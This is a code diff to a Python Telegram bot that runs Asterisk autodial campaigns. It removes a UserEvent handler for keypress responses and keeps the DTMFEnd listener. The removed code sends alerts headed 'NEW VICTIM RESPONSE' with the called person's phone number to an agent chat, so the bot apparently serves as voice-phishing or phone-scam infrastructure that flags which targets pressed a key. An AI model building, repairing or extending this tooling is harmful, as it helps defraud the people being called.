@@ -1715,87 +1715,7 @@ async def post_init(application: Application) -> None:
         except Exception as e:
             logger.error(f"Failed to send test notification to user {test_user_id}: {e}")
 
-        # UserEvent listener for AutoDialResponse events from dialplan
-        async def user_event_listener(manager, event):
-            """Handle UserEvent events from Asterisk dialplan."""
-            user_event_type = event.get('UserEvent')
-            
-            if user_event_type == 'AutoDialResponse':
-                pressed_one = event.get('PressedOne')
-                uniqueid = event.get('Uniqueid')
-                agent_id = event.get('AgentID')
-                target_number = event.get('CallerID')
-                campaign_id = event.get('CampaignID')
-                
-                logger.info(f"UserEvent AutoDialResponse - PressedOne: {pressed_one}, UniqueID: {uniqueid}, Target: {target_number}")
-                
-                if pressed_one == 'Yes':
-                    # This is the actual DTMF response we need to process
-                    await process_dtmf_response(uniqueid, '1', target_number, campaign_id, agent_id)
-                else:
-                    # No response or invalid digit - this is handled in hangup as failed
-                    logger.info(f"No DTMF response for call {uniqueid}")
-        
-        async def process_dtmf_response(uniqueid, digit, target_number, campaign_id, agent_id):
-            """Process DTMF response from UserEvent."""
-            try:
-                agent_id = int(agent_id) if agent_id else 7991166259
-                campaign_id = int(campaign_id) if campaign_id else None
-                
-                async with get_async_db_session() as session:
-                    call = await Call.find_by_uniqueid(session, uniqueid)
-                    
-                    if call:
-                        # Update call status to indicate DTMF was received
-                        call.status = 'dtmf_processed'
-                        call.dtmf_digits = digit
-                        
-                        # Update call metadata
-                        call.call_metadata = {
-                            **(call.call_metadata or {}),
-                            "dtmf_history": [{
-                                "time": datetime.now().isoformat(),
-                                "digit": digit,
-                                "uniqueid": uniqueid
-                            }],
-                            "dtmf_counted": True
-                        }
-                        
-                        await session.commit()
-                        logger.info(f"Updated call {call.call_id} with DTMF digit {digit}")
-                        
-                        # Get updated values from database record
-                        target_number = call.target_number
-                        campaign_id = call.campaign_id
-                        agent_id = call.agent_telegram_id or agent_id
-                
-                # Send DTMF notification
-                notification = f"🎯 <b>NEW VICTIM RESPONSE</b>\n\n"
-                notification += f"<b>#{campaign_id or 'Unknown'}</b>\n"
-                notification += f"<b>Pressed:</b> <code>{digit}</code>\n\n"
-                notification += f"<b>📱 Phone:</b> <code>{target_number}</code>\n"
-                notification += f"\n<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')}"
-                
-                # Send to campaign chat
-                target_chat_id = agent_id
-                if campaign_id and campaign_id in campaign_messages:
-                    target_chat_id = campaign_messages[campaign_id]["chat_id"]
-                
-                await global_application_instance.bot.send_message(
-                    chat_id=target_chat_id,
-                    text=notification,
-                    parse_mode='HTML'
-                )
-                
-                # Update campaign DTMF count
-                if campaign_id and campaign_id in campaign_states:
-                    campaign_states[campaign_id].dtmf_responses += 1
-                    await update_campaign_message(campaign_id)
-                
-                logger.info(f"Sent DTMF notification for {target_number} pressing {digit}")
-                
-            except Exception as e:
-                logger.error(f"Error processing DTMF response: {e}", exc_info=True)
+        # Keep the existing DTMFEnd listener - it already works
         
         # Newchannel event listener to map Uniqueid to call_id using database
         async def new_channel_event_listener(manager, event):
@@ -1961,14 +1881,13 @@ async def post_init(application: Application) -> None:
                 logger.debug(f"Ignoring non-autodial channel: {channel} (Context: {context})")
 
 
-        # Register event listeners
+        # Register event listeners - DTMFEnd captures the actual digit pressed
         ami_manager.register_event('Newchannel', new_channel_event_listener)
         ami_manager.register_event('Newstate', newstate_event_listener)  # SIP state tracking
         ami_manager.register_event('DialBegin', dial_begin_event_listener)  # Dial attempt tracking
         ami_manager.register_event('DialEnd', dial_end_event_listener)  # Dial result tracking
-        ami_manager.register_event('DTMFBegin', dtmf_begin_listener)  # Add DTMFBegin listener
-        ami_manager.register_event('DTMFEnd', dtmf_event_listener)
-        ami_manager.register_event('UserEvent', user_event_listener)  # CRITICAL: Handle DTMF from dialplan
+        ami_manager.register_event('DTMFBegin', dtmf_begin_listener)  # DTMF start detection
+        ami_manager.register_event('DTMFEnd', dtmf_event_listener)  # DTMF digit capture and notification
         ami_manager.register_event('Hangup', hangup_event_listener) # Register Hangup event listener
         ami_manager.register_event('BridgeEnter', bridge_event_listener) # Register Bridge event listener for ICM
         logger.info("AMI event listeners registered.")
